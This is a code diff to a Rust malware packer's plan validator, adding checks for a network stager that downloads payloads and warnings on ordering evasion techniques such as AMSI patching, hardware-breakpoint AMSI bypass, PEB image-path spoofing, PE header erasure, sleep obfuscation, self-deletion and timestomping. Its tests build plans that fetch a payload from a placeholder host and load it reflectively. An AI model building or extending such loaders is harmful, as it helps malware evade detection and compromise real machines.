@@ -12,6 +12,7 @@ use crate::engine::obfuscation::StringsConfig;
 use crate::engine::polymorphism::PolymorphismMode;
 use crate::engine::syscalls::{SyscallsConfig, SyscallsMode};
 use crate::error::{PackerError, Result};
+use crate::techniques::network_stager::{self, Downloader};
 use crate::techniques::{Capability, Stability, TechniqueKind};
 
 use super::schema::{Arch, DllEntry, OutputKind, PayloadFormat, Plan, StubPlan, Subsystem};
@@ -142,10 +143,11 @@ fn validate_stager(plan: &Plan, steps: &[ResolvedStep]) -> Result<()> {
         ));
     }
     let stager = stagers[0];
-    let (payload_name, url, crypto, key, nonce) = match &stager.technique {
+    let (payload_name, url, downloader, crypto, key, nonce) = match &stager.technique {
         TechniqueKind::NetworkStager { params } => (
             params.payload.as_str(),
             params.url.as_str(),
+            params.downloader,
             params.crypto,
             params.key.as_deref(),
             params.nonce.as_deref(),
@@ -200,6 +202,23 @@ fn validate_stager(plan: &Plan, steps: &[ResolvedStep]) -> Result<()> {
              https://, ftp:// or scp://",
             stager.index, stager.label
         )));
+    }
+
+    // The in-process transport only speaks http(s); `auto` routes an http(s) URL
+    // to it, so a URL it cannot parse is a build error for both.
+    let scheme_is_http = url.starts_with("http://") || url.starts_with("https://");
+    if downloader == Downloader::Winhttp && !scheme_is_http {
+        return Err(PackerError::Validation(format!(
+            "step {} ('{}') uses 'downloader: winhttp', which fetches in the loader's own process \
+             and only supports http:// and https:// URLs; use 'auto' or a child-process downloader \
+             for '{url}'",
+            stager.index, stager.label
+        )));
+    }
+    if scheme_is_http && matches!(downloader, Downloader::Auto | Downloader::Winhttp) {
+        network_stager::parse_http_url(url).map_err(|e| {
+            PackerError::Validation(format!("step {} ('{}'): {e}", stager.index, stager.label))
+        })?;
     }
 
     if crypto.is_encrypted() {
@@ -446,9 +465,17 @@ pub fn advisories(plan: &Plan) -> Vec<String> {
     // silently undone. The order is the fix, so the warning names it.
     let mut patched_ntdll_text = false;
     // `powershell_hosting` drives the PowerShell engine, which scans every script
-    // it compiles through AMSI: without a `patch_amsi` step before it the script
-    // is detected. The order is the fix, so the warning names it.
+    // it compiles through AMSI: without an AMSI-neutralizing step before it
+    // (`patch_amsi`, or `hardware_breakpoints` watching the scan exports) the
+    // script is detected. The order is the fix, so the warning names it.
     let mut patched_amsi = false;
+    // `image_path_spoofing` repoints the PEB `ImagePathName`, so a later step that
+    // resolves the running image's own path (`self_deletion`, a `timestomping`
+    // with no explicit target) would act on the decoy instead of the artifact.
+    let mut image_path_spoofed = false;
+    // `erase_pe_header` zeroes the loader's PE header, which `sleep_obfuscation`
+    // reads (`SizeOfImage`) to size the region it encrypts: the order matters.
+    let mut erased_header = false;
     // A technique that requires the indirect syscall layer (registry:
     // `requires_indirect_syscalls`) does nothing under `mode: none`.
     let indirect_active = SyscallsConfig::from_yaml(plan.build.stub.syscalls.as_ref())
@@ -480,11 +507,14 @@ pub fn advisories(plan: &Plan) -> Vec<String> {
             }
             TechniqueKind::PatchEtw { .. } => patched_ntdll_text = true,
             TechniqueKind::PatchAmsi { .. } => patched_amsi = true,
+            // A `hardware_breakpoints` step that watches the AMSI scan exports
+            // neutralizes AMSI too, so it satisfies the same requirement.
+            TechniqueKind::HardwareBreakpoints { params } if params.amsi => patched_amsi = true,
             TechniqueKind::PowershellHosting { .. } if !patched_amsi => {
                 warnings.push(format!(
                     "step {}: 'powershell_hosting' runs the script through the PowerShell engine, \
-                     which AMSI-scans it; add a 'patch_amsi' step before it or the script will be \
-                     detected",
+                     which AMSI-scans it; add a 'patch_amsi' (or a 'hardware_breakpoints') step \
+                     before it or the script will be detected",
                     step.index
                 ));
             }
@@ -506,6 +536,34 @@ pub fn advisories(plan: &Plan) -> Vec<String> {
                 }
             }
             TechniqueKind::AntiDebug { .. } => has_anti_debug = true,
+            TechniqueKind::ImagePathSpoofing { .. } => image_path_spoofed = true,
+            TechniqueKind::ErasePeHeader { .. } => erased_header = true,
+            TechniqueKind::SleepObfuscation { .. } if erased_header => {
+                warnings.push(format!(
+                    "step {}: 'sleep_obfuscation' reads `SizeOfImage` from the loader's PE header, \
+                     which an earlier 'erase_pe_header' step zeroed, so it cannot size the region it \
+                     encrypts — run 'sleep_obfuscation' before 'erase_pe_header'",
+                    step.index
+                ));
+            }
+            TechniqueKind::Timestomping { params }
+                if image_path_spoofed && params.target.is_none() =>
+            {
+                warnings.push(format!(
+                    "step {}: 'timestomping' has no explicit `target`, so it resolves the running \
+                     image's path at run time; an earlier 'image_path_spoofing' step repointed that \
+                     path in the PEB, so the stomp would hit the decoy — set an explicit `target` or \
+                     run the timestomp first",
+                    step.index
+                ));
+            }
+            TechniqueKind::SelfDeletion { .. } if image_path_spoofed => {
+                warnings.push(format!(
+                    "step {}: 'self_deletion' resolves the running image's own path, which an earlier \
+                     'image_path_spoofing' step repointed in the PEB, so it would act on the decoy",
+                    step.index
+                ));
+            }
             _ => {}
         }
     }
@@ -626,6 +684,24 @@ fn dll_advisories(plan: &Plan, steps: &[ResolvedStep]) -> Vec<String> {
                 "step {}: 'patch_amsi' loads `amsi.dll` when it is not already loaded, and a DLL \
                  host (`java.exe`, `python.exe`) usually has none — the step would bring the \
                  scanner into the process",
+                step.index
+            ));
+        }
+        if let TechniqueKind::ProcessMitigations { params } = &step.technique {
+            if params.block_dlls {
+                warnings.push(format!(
+                    "step {}: 'process_mitigations' with `block_dlls` applies the DLL block to the \
+                     *host* process (a DLL build has no image of its own): the host (`python.exe`, \
+                     `java.exe`) can no longer load a non-Microsoft module, which can break the \
+                     host's own plugins",
+                    step.index
+                ));
+            }
+        }
+        if matches!(&step.technique, TechniqueKind::ImagePathSpoofing { .. }) {
+            warnings.push(format!(
+                "step {}: 'image_path_spoofing' repoints the PEB, and in a DLL build the PEB is the \
+                 *host's* (`python.exe`, `java.exe`): the host process would report the decoy path",
                 step.index
             ));
         }
@@ -1158,6 +1234,48 @@ mod tests {
             "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.bin, format: shellcode }\n    b: { source: ./b.exe, format: pe }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n  - technique: sleep\n    params: { ms: 5 }\n  - technique: process_hollowing\n    params: { payload: b, target: \"C:\\\\x.exe\" }\n",
         );
         validate(&plan).expect("valid");
+    }
+
+    /// A plan whose runtime stages the payload `p` with the given stager params
+    /// and then runs it reflectively.
+    fn with_stager(params: &str) -> String {
+        with_runtime(&format!(
+            "  - technique: network_stager\n    params: {params}\n  - technique: reflective_loading\n    params: {{ payload: p }}\n"
+        ))
+    }
+
+    #[test]
+    fn accepts_a_winhttp_stager_with_an_https_url() {
+        let plan = parse(&with_stager(
+            "{ payload: p, url: \"https://example.invalid/a.bin\", downloader: winhttp }",
+        ));
+        validate(&plan).expect("valid");
+    }
+
+    #[test]
+    fn accepts_a_stager_with_an_ftp_url() {
+        let plan = parse(&with_stager(
+            "{ payload: p, url: \"ftp://example.invalid/a.bin\" }",
+        ));
+        validate(&plan).expect("valid");
+    }
+
+    #[test]
+    fn rejects_explicit_winhttp_with_a_non_http_scheme() {
+        let plan = parse(&with_stager(
+            "{ payload: p, url: \"ftp://example.invalid/a.bin\", downloader: winhttp }",
+        ));
+        let err = validate(&plan).expect_err("winhttp needs http(s)");
+        assert!(err.to_string().contains("winhttp"), "unclear: {err}");
+    }
+
+    #[test]
+    fn rejects_an_in_process_url_that_cannot_be_parsed() {
+        let plan = parse(&with_stager(
+            "{ payload: p, url: \"https://\", downloader: winhttp }",
+        ));
+        let err = validate(&plan).expect_err("no host");
+        assert!(err.to_string().contains("host"), "unclear: {err}");
     }
 
     #[test]
